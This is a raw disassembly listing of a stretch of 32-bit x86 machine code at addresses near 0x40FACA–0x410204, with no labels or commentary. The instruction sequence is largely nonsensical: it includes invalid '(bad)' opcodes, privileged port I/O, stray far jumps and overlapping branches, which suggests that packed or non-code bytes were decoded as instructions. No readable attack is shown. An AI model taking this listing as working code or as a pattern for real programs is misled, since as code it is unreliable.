  40faca:	sub    BYTE PTR [eax+0x38],bl
  40facd:	xlat   BYTE PTR ds:[ebx]
  40face:	mov    cl,0x98
  40fad0:	fidivr DWORD PTR [eax-0xe45e489]
  40fad6:	jl     0x40fb04
  40fad8:	push   edi
  40fad9:	hlt    
  40fada:	pop    edx
  40fadb:	dec    esp
  40fadc:	icebp  
  40fadd:	out    0x9a,eax
  40fadf:	sbb    ch,BYTE PTR [ecx+0x44]
  40fae2:	lods   al,BYTE PTR ds:[esi]
  40fae3:	add    al,0x4e
  40fae5:	les    ebp,FWORD PTR [esi]
  40fae7:	mov    WORD PTR [ebx+0x24e25bbb],ss
  40faed:	lods   al,BYTE PTR ds:[esi]
  40faee:	jle    0x40fb3c
  40faf0:	jb     0x40fb6e
  40faf2:	sub    eax,0x7339f184
  40faf7:	push   esi
  40faf8:	aas    
  40faf9:	add    DWORD PTR [esi+ecx*2-0x5b],ebp
  40fafd:	cmp    eax,0xe47aad80
  40fb02:	xor    bl,BYTE PTR [edi+0x64af6276]
  40fb08:	je     0x40fb16
  40fb0a:	jne    0x40fab2
  40fb0c:	aas    
  40fb0d:	inc    edx
  40fb0e:	cmp    ah,BYTE PTR [ecx+edi*1+0x44]
  40fb12:	jbe    0x40fb4c
  40fb14:	inc    edx
  40fb15:	jg     0x40faa3
  40fb17:	test   DWORD PTR [edi+ebx*4],ecx
  40fb1a:	cmc    
  40fb1b:	cmc    
  40fb1c:	test   DWORD PTR [ebx+ebx*2],esp
  40fb1f:	xor    bh,BYTE PTR [esi]
  40fb21:	hlt    
  40fb22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fb23:	mov    ebp,0x837817cc
  40fb28:	cmp    edi,edi
  40fb2a:	inc    ebp
  40fb2b:	lods   al,BYTE PTR ds:[esi]
  40fb2c:	push   ebx
  40fb2d:	lock pop ebx
  40fb2f:	test   al,0xad
  40fb31:	in     eax,0xf8
  40fb33:	adc    esp,DWORD PTR [esi+0xe]
  40fb36:	enter  0x3ec9,0x7c
  40fb3a:	scas   eax,DWORD PTR es:[edi]
  40fb3b:	clc    
  40fb3c:	ficomp DWORD PTR [ecx+0x653ffc80]
  40fb42:	xchg   DWORD PTR [esi+0x41fb0173],ebx
  40fb48:	mov    ah,ah
  40fb4a:	test   al,0x1e
  40fb4c:	and    edx,DWORD PTR [ebx+0x17780554]
  40fb52:	mov    edi,0xc2b33c0c
  40fb57:	mov    bl,0x99
  40fb5a:	xlat   BYTE PTR ds:[ebx]
  40fb5b:	inc    edi
  40fb5c:	in     al,0xce
  40fb5e:	push   esi
  40fb5f:	xlat   BYTE PTR ds:[ebx]
  40fb60:	jo     0x40fb49
  40fb62:	cli    
  40fb63:	jmp    0x40fbc5
  40fb65:	sti    
  40fb66:	pop    ecx
  40fb67:	push   ss
  40fb68:	ins    BYTE PTR es:[edi],dx
  40fb69:	(bad)  
  40fb6b:	imul   esp
  40fb6d:	mov    dl,0x5b
  40fb6f:	sub    bl,BYTE PTR [ebx+ebp*2-0x7819d313]
  40fb76:	js     0x40fb77
  40fb78:	push   edx
  40fb79:	popa   
  40fb7a:	pop    ebx
  40fb7b:	mov    al,BYTE PTR [ecx-0x1ecf9312]
  40fb81:	add    eax,0xecdd7c5a
  40fb86:	cmp    al,0xc2
  40fb88:	mov    WORD PTR [ebp+0x5d],?
  40fb8b:	mov    esp,0x3b9de7ff
  40fb90:	icebp  
  40fb91:	jmp    0xcd23cfdb
  40fb96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fb97:	xchg   edi,eax
  40fb98:	push   cs
  40fb99:	dec    esi
  40fb9a:	pop    edx
  40fb9b:	retf   0xd9c9
  40fb9e:	cmp    al,ch
  40fba0:	(bad)  
  40fba1:	rcr    ch,cl
  40fba3:	test   DWORD PTR [edx-0x6b],esp
  40fba6:	jnp    0x40fb53
  40fba8:	dec    edx
  40fba9:	mov    eax,ds:0x212c6c8d
  40fbae:	iret   
  40fbaf:	test   DWORD PTR [edi+0x69],ecx
  40fbb2:	mov    dh,0x51
  40fbb4:	in     al,dx
  40fbb5:	dec    edi
  40fbb6:	rol    BYTE PTR [ebx+0x2151b057],1
  40fbbc:	jp     0x40fbb8
  40fbbe:	sub    eax,DWORD PTR [ebx]
  40fbc0:	or     ebx,ebp
  40fbc2:	pop    ebx
  40fbc3:	add    BYTE PTR ds:0xc4ca5e8a,0x13
  40fbca:	into   
  40fbcb:	xchg   edx,eax
  40fbcc:	xor    BYTE PTR [eax+ebp*1+0x46c25e23],cl
  40fbd3:	les    esi,FWORD PTR [eax]
  40fbd5:	and    DWORD PTR [eax],esp
  40fbd7:	pop    edi
  40fbd8:	jno    0x40fb67
  40fbda:	les    edi,FWORD PTR [eax]
  40fbdc:	ins    DWORD PTR es:[edi],dx
  40fbdd:	fwait
  40fbde:	pop    edx
  40fbdf:	test   eax,0x8be167d8
  40fbe4:	imul   eax,DWORD PTR [edi-0x7005d9dc],0x3f909fe
  40fbee:	pop    ebp
  40fbef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fbf0:	mul    BYTE PTR [esi]
  40fbf2:	ror    DWORD PTR [ebp-0x7ab504ad],cl
  40fbf8:	add    dl,BYTE PTR [esi+0x3e]
  40fbfb:	adc    al,0x23
  40fbfd:	popf   
  40fbfe:	fistp  DWORD PTR [ebx+0x3a]
  40fc01:	cdq    
  40fc02:	adc    eax,0x834637b7
  40fc07:	in     eax,0x12
  40fc09:	sub    al,bl
  40fc0b:	inc    ebp
  40fc0c:	mov    ebp,ds
  40fc0e:	mov    cl,BYTE PTR [edx-0x168ed9fb]
  40fc14:	xchg   edx,eax
  40fc15:	aad    0x88
  40fc17:	in     al,0xc3
  40fc19:	cmp    al,0x44
  40fc1b:	xor    BYTE PTR [ebx+0x20c44120],ch
  40fc21:	out    0x92,al
  40fc23:	inc    ecx
  40fc24:	xchg   ebp,eax
  40fc25:	cmp    BYTE PTR [esi+eax*8+0x2c1e6b4],ah
  40fc2c:	ret    
  40fc2d:	add    DWORD PTR [edx-0x3e],ebx
  40fc30:	adc    cl,BYTE PTR [esi+0x15f8128d]
  40fc36:	mov    ds:0xb5e60f8f,eax
  40fc3b:	loopne 0x40fbf7
  40fc3d:	mov    ecx,0x1dea99e
  40fc42:	pop    ebx
  40fc43:	dec    eax
  40fc44:	jbe    0x40fc6c
  40fc46:	loope  0x40fc75
  40fc48:	sbb    bh,dl
  40fc4a:	pop    es
  40fc4b:	and    BYTE PTR [ebp-0x44],0x60
  40fc4f:	sub    DWORD PTR [eax-0x1a],esi
  40fc52:	sub    cl,al
  40fc54:	xor    al,0x75
  40fc56:	std    
  40fc57:	sub    BYTE PTR [esi-0x15f18928],dh
  40fc5d:	data16 stos BYTE PTR es:[edi],al
  40fc5f:	mov    edx,esp
  40fc61:	or     DWORD PTR [ecx+0x1aaee75c],edx
  40fc67:	jge    0x40fce5
  40fc69:	fcomp  QWORD PTR [ebx+0x10]
  40fc6c:	mov    ds:0xa29c61d,eax
  40fc71:	call   0xd981:0xafc385a4
  40fc78:	fiadd  DWORD PTR [ebp-0x17]
  40fc7b:	xor    ebp,DWORD PTR [esi]
  40fc7d:	hlt    
  40fc7e:	pop    edx
  40fc7f:	or     BYTE PTR [edi-0x4b49d215],0xe6
  40fc86:	inc    esp
  40fc87:	gs jb  0x40fcfd
  40fc8a:	mov    WORD PTR [eax-0x302d883b],ss
  40fc90:	sbb    al,0x17
  40fc92:	pop    edx
  40fc93:	outs   dx,BYTE PTR ds:[esi]
  40fc94:	shl    DWORD PTR [esi-0x1911efe1],0x2e
  40fc9b:	ja     0x40fca9
  40fc9d:	loopne 0x40fc48
  40fc9f:	mov    bh,BYTE PTR [esi]
  40fca1:	jo     0x40fd11
  40fca3:	push   ecx
  40fca4:	mov    dl,0x80
  40fca6:	pop    ebx
  40fca7:	jmp    0xe7fe:0xf60118da
  40fcae:	push   ds
  40fcaf:	jne    0x40fcc2
  40fcb1:	mov    bl,0x4a
  40fcb3:	dec    eax
  40fcb4:	or     dl,BYTE PTR ds:[ebp+0x455f9031]
  40fcbb:	rcr    BYTE PTR fs:[edi-0x18e63a19],1
  40fcc2:	mov    esi,0x1f57ba96
  40fcc7:	js     0x40fc8a
  40fcc9:	mov    DWORD PTR [ebx],ecx
  40fccb:	jle    0x40fcb3
  40fccd:	push   esi
  40fcce:	pop    edx
  40fccf:	push   eax
  40fcd0:	lea    ebp,[esi+0x123e1907]
  40fcd6:	test   DWORD PTR [ebp+0x58e38fa1],eax
  40fcdc:	ds jge 0x40fc9c
  40fcdf:	stos   DWORD PTR es:[edi],eax
  40fce0:	push   eax
  40fce1:	and    esi,DWORD PTR [ecx]
  40fce3:	mov    esi,0xd23ce77e
  40fce8:	cmp    bl,BYTE PTR [esi-0x427d565c]
  40fcee:	push   ebx
  40fcef:	aad    0x3f
  40fcf1:	aas    
  40fcf2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fcf3:	call   0xe62e:0xd9306dc8
  40fcfa:	inc    edx
  40fcfb:	push   eax
  40fcfc:	add    eax,0x372dd1a2
  40fd01:	scas   eax,DWORD PTR es:[edi]
  40fd02:	mov    ebx,0x5a1c2285
  40fd07:	retf   0x72d2
  40fd0a:	lods   eax,DWORD PTR ds:[esi]
  40fd0b:	sar    BYTE PTR [eax],0xcd
  40fd0e:	sub    al,0x86
  40fd10:	loope  0x40fd28
  40fd12:	fdiv   st,st(1)
  40fd14:	arpl   bx,bx
  40fd16:	push   ss
  40fd17:	xor    al,0x10
  40fd19:	addr16 pop edx
  40fd1b:	outs   dx,BYTE PTR ds:[esi]
  40fd1c:	lahf   
  40fd1d:	lea    ecx,[ebx+0x64]
  40fd20:	out    dx,eax
  40fd21:	in     eax,0xd0
  40fd23:	push   eax
  40fd24:	stos   DWORD PTR es:[edi],eax
  40fd25:	stos   DWORD PTR es:[edi],eax
  40fd26:	(bad)  
  40fd27:	(bad)  
  40fd29:	mov    es:0xec5d3f39,eax
  40fd2f:	add    esp,edx
  40fd31:	jge    0x40fd55
  40fd33:	sbb    al,al
  40fd35:	add    eax,0x2e48238e
  40fd3a:	fwait
  40fd3b:	test   DWORD PTR [esi+ebx*4+0x7],ebp
  40fd3f:	repz ds xchg edi,ecx
  40fd43:	lods   al,BYTE PTR ds:[esi]
  40fd44:	and    cl,al
  40fd46:	jmp    0xc9282e96
  40fd4b:	jge    0x40fd6a
  40fd4d:	cdq    
  40fd4e:	and    BYTE PTR [ecx],ch
  40fd50:	and    dl,BYTE PTR fs:[esi+0x60837afe]
  40fd57:	out    0x4b,al
  40fd59:	out    0x86,eax
  40fd5b:	call   ecx
  40fd5d:	or     al,0x4a
  40fd5f:	mov    bl,0xb6
  40fd61:	out    0x4c,eax
  40fd63:	in     eax,dx
  40fd64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fd65:	lods   al,BYTE PTR ds:[esi]
  40fd66:	daa    
  40fd67:	inc    esp
  40fd68:	fst    QWORD PTR [esi-0x4f5ab01c]
  40fd6e:	push   ecx
  40fd6f:	mov    al,0x3f
  40fd71:	sub    bh,bh
  40fd73:	test   BYTE PTR [esi-0x1a],ah
  40fd76:	out    dx,al
  40fd77:	xchg   edx,eax
  40fd78:	ins    BYTE PTR es:[edi],dx
  40fd79:	and    esp,DWORD PTR [esp+edx*2+0x6002b36f]
  40fd80:	aas    
  40fd81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fd82:	mov    dl,0xd1
  40fd84:	stos   BYTE PTR es:[edi],al
  40fd85:	aam    0xd0
  40fd87:	sub    BYTE PTR ds:0x24734a1c,bl
  40fd8d:	addr16 push esi
  40fd8f:	cwde   
  40fd90:	aas    
  40fd91:	pushf  
  40fd92:	push   ebx
  40fd93:	dec    esi
  40fd94:	push   ecx
  40fd95:	xor    eax,DWORD PTR ds:0x27e76736
  40fd9b:	mov    dh,0x62
  40fd9d:	and    al,0xc8
  40fd9f:	and    ch,al
  40fda1:	xlat   BYTE PTR ds:[ebx]
  40fda2:	mov    ds:0x8b6295d4,al
  40fda7:	(bad)  
  40fda8:	aas    
  40fda9:	imul   ebx,esp,0x59
  40fdac:	repnz stos BYTE PTR es:[edi],al
  40fdae:	jmp    0x40fd60
  40fdb0:	adc    al,0x3f
  40fdb2:	lods   eax,DWORD PTR ds:[esi]
  40fdb3:	sub    BYTE PTR [esi],ch
  40fdb5:	mov    ds:0x47718460,eax
  40fdba:	repnz lds edi,FWORD PTR [edi]
  40fdbd:	loope  0x40fe38
  40fdbf:	xor    al,0x7c
  40fdc1:	jo     0x40fe21
  40fdc3:	loop   0x40fd97
  40fdc5:	daa    
  40fdc6:	dec    ebp
  40fdc7:	push   esp
  40fdc8:	inc    esi
  40fdc9:	jge    0x40fd89
  40fdcb:	test   DWORD PTR [esi+edi*2-0x48c13410],ecx
  40fdd2:	mov    ecx,0x7a419d6
  40fdd7:	xchg   ebx,eax
  40fdd8:	sub    ch,ah
  40fdda:	and    BYTE PTR [edi],dh
  40fddc:	mov    dl,0x51
  40fdde:	push   edi
  40fddf:	push   edx
  40fde0:	push   ebp
  40fde1:	mov    ds:0xb3e042f,al
  40fde6:	dec    edi
  40fde7:	or     al,0xee
  40fde9:	xchg   BYTE PTR [edi+esi*4],cl
  40fdec:	not    BYTE PTR [ebx]
  40fdee:	pop    ss
  40fdef:	cmp    edx,DWORD PTR [esi+0x5e]
  40fdf2:	jl     0x40fd79
  40fdf4:	inc    ecx
  40fdf5:	push   ecx
  40fdf6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fdf7:	dec    edx
  40fdf8:	ds ja  0x40fdbc
  40fdfb:	aas    
  40fdfc:	pop    ecx
  40fdfd:	and    DWORD PTR [edx+edx*2],esi
  40fe00:	pop    edi
  40fe01:	out    0xd6,al
  40fe03:	add    BYTE PTR [edx],dh
  40fe05:	jnp    0x40fdf6
  40fe07:	and    ch,BYTE PTR [ecx]
  40fe09:	stos   BYTE PTR es:[edi],al
  40fe0a:	push   ebx
  40fe0b:	xchg   esp,eax
  40fe0c:	in     eax,0xdb
  40fe0e:	pop    edx
  40fe0f:	and    bh,al
  40fe11:	lds    esi,FWORD PTR [esi+0x66]
  40fe14:	sahf   
  40fe15:	adc    al,0x92
  40fe17:	test   DWORD PTR [eax+0x3eb1612d],ebp
  40fe1d:	jnp    0x40fe24
  40fe1f:	or     bl,BYTE PTR [ebx]
  40fe21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fe22:	or     al,0x3d
  40fe24:	or     edi,esp
  40fe26:	fidiv  DWORD PTR [ebx+0x1c6a15aa]
  40fe2c:	ins    BYTE PTR es:[edi],dx
  40fe2d:	sub    edx,DWORD PTR [esi+0x35]
  40fe30:	pusha  
  40fe31:	jp     0x40fe8d
  40fe33:	inc    eax
  40fe34:	es pusha 
  40fe36:	lock pop esi
  40fe38:	es stos DWORD PTR es:[edi],eax
  40fe3a:	rol    BYTE PTR [esp+ebx*1+0x222def3b],0xc3
  40fe42:	ror    BYTE PTR [ebx+0x598ba63a],cl
  40fe48:	inc    ebx
  40fe49:	sbb    eax,DWORD PTR [eax+0xb447c4d]
  40fe4f:	cdq    
  40fe50:	in     al,dx
  40fe51:	sbb    esp,ebp
  40fe53:	ins    DWORD PTR es:[edi],dx
  40fe54:	int    0xec
  40fe56:	pop    ebx
  40fe57:	inc    edi
  40fe58:	ds pop ebx
  40fe5a:	or     al,0x5a
  40fe5c:	scas   al,BYTE PTR es:[edi]
  40fe5d:	retf   
  40fe5e:	xor    BYTE PTR [edx+0x4f74e702],ah
  40fe64:	fistp  QWORD PTR [ecx-0x43f5aa20]
  40fe6a:	add    eax,0x58693947
  40fe6f:	push   0x8eb85220
  40fe74:	jle    0x40fe5d
  40fe76:	call   0x5fad:0xe5e52a90
  40fe7d:	sbb    edx,eax
  40fe7f:	inc    esp
  40fe80:	dec    eax
  40fe81:	push   ebp
  40fe82:	pop    edx
  40fe83:	and    al,0xd6
  40fe85:	mov    gs,WORD PTR [ebp+0x52b8e4a2]
  40fe8b:	test   BYTE PTR [ebp-0x77],ch
  40fe8e:	outs   dx,DWORD PTR ds:[esi]
  40fe8f:	arpl   WORD PTR [di],cx
  40fe92:	lds    esi,FWORD PTR [ebp-0x458f96c2]
  40fe98:	(bad)  
  40fe99:	xor    esi,DWORD PTR [edi+eiz*8-0x38]
  40fe9d:	jae    0x40fecf
  40fe9f:	test   DWORD PTR [eax],ecx
  40fea1:	push   esi
  40fea2:	push   esp
  40fea3:	sub    BYTE PTR [edi],bh
  40fea5:	cmp    DWORD PTR [edx+0x6b084a13],eax
  40feab:	fwait
  40feac:	inc    edi
  40fead:	out    0x66,al
  40feaf:	inc    edx
  40feb0:	inc    edx
  40feb1:	inc    ebp
  40feb2:	popa   
  40feb3:	jge    0x40feca
  40feb5:	(bad)  
  40feb6:	jle    0x40ff35
  40feb8:	fdiv   QWORD PTR [edi]
  40feba:	pop    edx
  40febb:	(bad)  
  40febc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40febd:	je     0x40fe60
  40febf:	sub    esi,edx
  40fec1:	stos   BYTE PTR es:[edi],al
  40fec2:	sub    bl,BYTE PTR [ebx+0x4a03cce3]
  40fec8:	pushf  
  40fec9:	fstp   DWORD PTR [edx+0x22733ff2]
  40fecf:	out    0xb,al
  40fed1:	mov    WORD PTR [ebx],?
  40fed3:	ret    
  40fed4:	and    esp,esi
  40fed6:	dec    esp
  40fed7:	and    BYTE PTR [ebp+0x7fffb668],al
  40fedd:	inc    edi
  40fede:	push   edx
  40fedf:	and    bh,BYTE PTR [esi]
  40fee1:	jae    0x40fe7e
  40fee3:	fisttp WORD PTR [edx-0x57]
  40fee6:	add    ebx,DWORD PTR [edi]
  40fee8:	sub    dh,ah
  40feea:	jb     0x40ff28
  40feec:	sbb    al,0xe4
  40feee:	lea    esi,[eax+ecx*1]
  40fef1:	scas   eax,DWORD PTR es:[edi]
  40fef2:	adc    DWORD PTR [eax-0x6e],ebx
  40fef5:	fadd   DWORD PTR [ebp-0x46]
  40fef8:	jae    0x40ff6c
  40fefa:	call   0x22f3:0x141ef04b
  40ff01:	mov    esi,0xe721fbdb
  40ff06:	ss ins DWORD PTR es:[edi],dx
  40ff08:	mov    edi,0x8fe0b03f
  40ff0d:	add    ch,BYTE PTR [esi+0x5df09fd8]
  40ff13:	sub    bh,BYTE PTR [ebx-0x79]
  40ff16:	daa    
  40ff17:	inc    esi
  40ff18:	mov    al,ds:0xe8af193a
  40ff1d:	jmp    0x847f:0x11fdbc2b
  40ff24:	ins    BYTE PTR es:[edi],dx
  40ff25:	push   eax
  40ff26:	mov    dl,dl
  40ff28:	ss repnz pop ebp
  40ff2b:	adc    cl,al
  40ff2d:	mov    dh,0x93
  40ff2f:	test   BYTE PTR [eax+edi*2],bh
  40ff32:	in     al,dx
  40ff33:	int    0xd
  40ff35:	out    0xe,eax
  40ff37:	aam    0x5d
  40ff39:	retf   0xe33f
  40ff3c:	fcmovne st,st(1)
  40ff3e:	sub    ch,BYTE PTR [edi]
  40ff40:	and    ebp,esp
  40ff42:	mov    edx,0x5e11c154
  40ff47:	out    dx,eax
  40ff48:	cmc    
  40ff49:	lods   al,BYTE PTR ds:[esi]
  40ff4a:	aam    0x5c
  40ff4c:	retf   
  40ff4d:	out    0x2f,al
  40ff4f:	mov    BYTE PTR [ecx],dh
  40ff51:	cmp    dh,BYTE PTR [ebp+0x49d7191b]
  40ff57:	sbb    DWORD PTR [esi+0x63],esi
  40ff5a:	inc    ebx
  40ff5b:	xchg   ecx,eax
  40ff5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ff5e:	rol    DWORD PTR [edi+0x2df23ff1],0x6a
  40ff65:	(bad)  
  40ff66:	pop    edx
  40ff67:	pusha  
  40ff68:	adc    BYTE PTR [eax-0x74],0x42
  40ff6c:	xchg   esi,eax
  40ff6d:	sbb    eax,DWORD PTR [ecx]
  40ff6f:	test   esi,ebp
  40ff71:	xchg   DWORD PTR [ecx+ebx*1-0x375efcc1],edi
  40ff78:	fwait
  40ff79:	adc    dh,bh
  40ff7b:	jb     0x40ffb9
  40ff7d:	out    0x2,al
  40ff7f:	adc    esi,ebx
  40ff81:	mov    ebp,0x8cd7acbd
  40ff86:	cdq    
  40ff87:	sti    
  40ff88:	and    DWORD PTR ds:0x9ba7d25b,edx
  40ff8e:	bound  ebp,QWORD PTR [ebx]
  40ff90:	push   eax
  40ff91:	into   
  40ff92:	fild   DWORD PTR [edi+ebx*4+0x3f044609]
  40ff99:	out    dx,eax
  40ff9a:	jmp    0xa586:0x8d091703
  40ffa1:	out    0x10,eax
  40ffa3:	jle    0x40fffd
  40ffa5:	xor    edi,DWORD PTR [ebx]
  40ffa7:	or     esp,ebx
  40ffa9:	enter  0xe09,0x3e
  40ffad:	ins    DWORD PTR es:[edi],dx
  40ffae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ffaf:	shl    BYTE PTR [edx],cl
  40ffb1:	repz xlat BYTE PTR ds:[ebx]
  40ffb3:	outs   dx,DWORD PTR ds:[esi]
  40ffb4:	or     esi,DWORD PTR [edi-0x10]
  40ffb7:	pusha  
  40ffb8:	ds inc ebp
  40ffba:	daa    
  40ffbb:	dec    edi
  40ffbc:	mov    ch,0xb8
  40ffbe:	aad    0xfc
  40ffc0:	ds leave 
  40ffc2:	dec    ebx
  40ffc3:	xchg   ebx,eax
  40ffc4:	ret    
  40ffc5:	in     al,dx
  40ffc6:	call   0x5cde:0xfae6e141
  40ffcd:	adc    BYTE PTR [ebp+0x1],ch
  40ffd0:	jmp    0xb7bf:0x22fde2c1
  40ffd7:	rol    eax,cl
  40ffd9:	out    0xef,eax
  40ffdb:	ret    0x7de0
  40ffde:	mov    ebp,0x676e50e1
  40ffe3:	test   BYTE PTR [edx],dh
  40ffe5:	popa   
  40ffe6:	jbe    0x40ff79
  40ffe8:	aas    
  40ffe9:	inc    ebp
  40ffea:	fwait
  40ffeb:	and    BYTE PTR [ebp+ecx*2-0x19c65284],ah
  40fff2:	cmp    BYTE PTR [ebp+0x44956d0],al
  40fff8:	popa   
  40fff9:	push   0xe79c5607
  40fffe:	sub    dh,BYTE PTR [eax]
  410000:	add    esp,ebx
  410002:	iret   
  410003:	shl    ch,0xe6
  410006:	rol    BYTE PTR [edi-0x7380ae53],1
  41000c:	sar    BYTE PTR [edx+0x26],0x92
  410010:	mov    ebp,0x7ef628e9
  410015:	mov    bh,0x9e
  410017:	or     DWORD PTR [ebx+eiz*8-0x26],edi
  41001b:	popa   
  41001c:	jbe    0x410069
  41001e:	lds    eax,FWORD PTR [edi+0x4a9774ed]
  410024:	xchg   ebx,eax
  410025:	pop    ds
  410026:	shl    DWORD PTR [esi-0x1],1
  410029:	push   0x25c072d7
  41002e:	inc    ebp
  41002f:	sub    bl,BYTE PTR [ebp-0x52]
  410032:	pop    eax
  410033:	inc    esp
  410034:	mov    eax,ds:0xa34882e5
  410039:	mov    ds:0x178da0f2,al
  41003e:	arpl   WORD PTR [esi-0x27],sp
  410041:	lahf   
  410042:	lock push cs
  410044:	push   esi
  410045:	ss pop ebx
  410047:	into   
  410048:	cmp    DWORD PTR [ebx+edx*2+0x157d3ad6],eax
  41004f:	test   BYTE PTR [ebp-0x73],ah
  410052:	and    DWORD PTR [edx+0x75cc9507],0x3e
  410059:	in     eax,dx
  41005a:	inc    ecx
  41005b:	fs jbe 0x410031
  41005e:	push   0x5728b611
  410063:	test   BYTE PTR [edx+0x34520057],al
  410069:	sbb    edx,DWORD PTR [ecx]
  41006b:	adc    ebp,DWORD PTR [esi]
  41006d:	les    edi,FWORD PTR [eax]
  41006f:	inc    eax
  410070:	adc    eax,0x3023daf7
  410075:	lods   eax,DWORD PTR ds:[esi]
  410076:	enter  0x63f5,0xf2
  41007a:	pop    edx
  41007b:	push   esi
  41007c:	fsubr  DWORD PTR [edi-0x7a5fec1a]
  410082:	pop    edx
  410083:	sbb    al,0x82
  410085:	sbb    DWORD PTR [ecx-0x3],ecx
  410088:	mov    al,0xf8
  41008a:	pop    esp
  41008b:	sbb    BYTE PTR [eax-0x205d9968],0x6f
  410092:	stos   DWORD PTR es:[edi],eax
  410093:	cmc    
  410094:	pop    eax
  410095:	pop    DWORD PTR [ebp+0x4e]
  410098:	jmp    0x379cb303
  41009d:	sti    
  41009e:	jbe    0x4100b5
  4100a0:	push   ds
  4100a1:	arpl   WORD PTR [ebp-0x1779c67b],sp
  4100a7:	xchg   esp,eax
  4100a8:	ds pop ds
  4100aa:	retf   0x3120
  4100ad:	stos   DWORD PTR es:[edi],eax
  4100ae:	push   ebx
  4100af:	ins    DWORD PTR es:[edi],dx
  4100b0:	xchg   edi,eax
  4100b1:	out    0xcc,al
  4100b3:	arpl   dx,dx
  4100b5:	inc    ecx
  4100b6:	jne    0x4100bf
  4100b8:	mov    ah,0xa7
  4100ba:	mov    cl,0xfa
  4100bc:	(bad)  
  4100bd:	fldenv [eax-0x42]
  4100c0:	xchg   ebp,eax
  4100c1:	pop    edx
  4100c2:	fimul  DWORD PTR [ebp+0x2]
  4100c5:	out    0xf4,al
  4100c7:	xor    DWORD PTR [eax+0x1dddefb],esi
  4100cd:	or     bl,BYTE PTR [esi]
  4100cf:	rol    dh,1
  4100d1:	out    dx,eax
  4100d2:	pusha  
  4100d3:	mov    dl,0x30
  4100d5:	scas   eax,DWORD PTR es:[edi]
  4100d6:	pop    ebx
  4100d7:	in     al,0x5c
  4100d9:	fdivr  QWORD PTR [edx+0x30666f3f]
  4100df:	mov    dh,0x7c
  4100e1:	pop    esp
  4100e2:	daa    
  4100e3:	sub    al,0x3f
  4100e5:	out    0xc7,eax
  4100e7:	sahf   
  4100e8:	xchg   ecx,ecx
  4100ea:	enter  0x32c3,0xfa
  4100ee:	add    bh,BYTE PTR [ebp-0x69c642ec]
  4100f4:	push   0x5c
  4100f6:	fistp  DWORD PTR [ecx+0x3f]
  4100f9:	icebp  
  4100fa:	ret    
  4100fb:	outs   dx,DWORD PTR ds:[esi]
  4100fc:	push   ebx
  4100fd:	and    eax,0xe1f7744a
  410102:	push   es
  410103:	mov    ch,0xd2
  410105:	(bad)  
  410106:	adc    al,BYTE PTR [edi]
  410108:	into   
  410109:	push   edx
  41010a:	mov    ebx,0x324d3e05
  41010f:	stos   DWORD PTR es:[edi],eax
  410110:	jg     0x41017f
  410112:	loope  0x4100af
  410114:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410115:	out    0xe,eax
  410117:	mov    ah,0xe0
  410119:	in     al,0x51
  41011b:	scas   al,BYTE PTR es:[edi]
  41011c:	jp     0x4100f7
  41011e:	rol    ebx,0x2c
  410121:	adc    eax,0xa69e825d
  410126:	and    DWORD PTR [edx+esi*4-0x1f],0x340f38e4
  41012e:	push   ss
  41012f:	push   ebp
  410130:	(bad)  
  410131:	inc    di
  410133:	in     eax,dx
  410134:	jns    0x410132
  410136:	fwait
  410137:	mov    cl,0x12
  410139:	sbb    DWORD PTR [ebx+0x6],0xf9331c1f
  410140:	data16 or al,0x78
  410143:	test   DWORD PTR [eax+0x4143106a],ecx
  410149:	add    eax,0x6164d4c6
  41014e:	test   BYTE PTR ds:[edx+eiz*8+0x74b0ce52],dh
  410156:	pop    ebp
  410157:	test   ebp,edx
  410159:	fist   WORD PTR [edx-0x6fe4c606]
  41015f:	jl     0x41010a
  410161:	and    dh,bl
  410163:	xor    ah,BYTE PTR [edi-0x73]
  410166:	xchg   esi,eax
  410167:	xchg   esp,eax
  410168:	or     BYTE PTR [esi],ah
  41016a:	dec    ebx
  41016b:	test   BYTE PTR [edx],bh
  41016d:	xchg   edx,eax
  41016e:	adc    dh,BYTE PTR [ebx+0x3c]
  410171:	pop    es
  410172:	fisubr DWORD PTR [ebx-0x75f11363]
  410178:	(bad)  
  410179:	pop    edx
  41017a:	mov    al,ds:0x1798deb0
  41017f:	xchg   bl,dh
  410181:	das    
  410182:	(bad)  
  410183:	ror    DWORD PTR [ecx],1
  410185:	xchg   BYTE PTR [edx+0x5b5eb23c],dh
  41018b:	out    dx,al
  41018c:	ss jl  0x4101ac
  41018f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410190:	mov    esi,0x3085226f
  410195:	sbb    al,0x84
  410197:	mov    bh,BYTE PTR [esi]
  410199:	sete   bh
  41019c:	rol    BYTE PTR [edx+eiz*2+0x16e76846],cl
  4101a3:	and    DWORD PTR [edi+eax*8],edi
  4101a6:	mov    ds:0xfa5515d5,eax
  4101ab:	imul   edi,DWORD PTR ds:0x5ee655da,0xffffff9b
  4101b2:	enter  0x147f,0xe6
  4101b6:	jmp    0xcd07:0x6861c140
  4101bd:	(bad)  
  4101be:	xchg   esp,eax
  4101bf:	ds aas 
  4101c1:	loope  0x4101ee
  4101c3:	mov    ecx,0xb7ca039c
  4101c8:	cdq    
  4101c9:	out    0xc2,al
  4101cb:	call   0xfc34:0xc3fb5a4e
  4101d2:	dec    edi
  4101d3:	loopne 0x410174
  4101d5:	daa    
  4101d6:	pop    edx
  4101d7:	push   edx
  4101d8:	or     al,0x36
  4101da:	shr    BYTE PTR [ecx+0x69c6e665],0x9a
  4101e1:	jle    0x41018e
  4101e3:	mov    ebx,0xb430d453
  4101e8:	test   eax,0xfd2a5416
  4101ed:	mov    ds:0x309625c0,al
  4101f2:	scas   eax,DWORD PTR es:[edi]
  4101f3:	mov    BYTE PTR [edx],0xbe
  4101f6:	rol    DWORD PTR [ecx+eiz*4-0x5f34318],0xe0
  4101fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4101ff:	mov    eax,0xd0644e29
  410204:	aas    
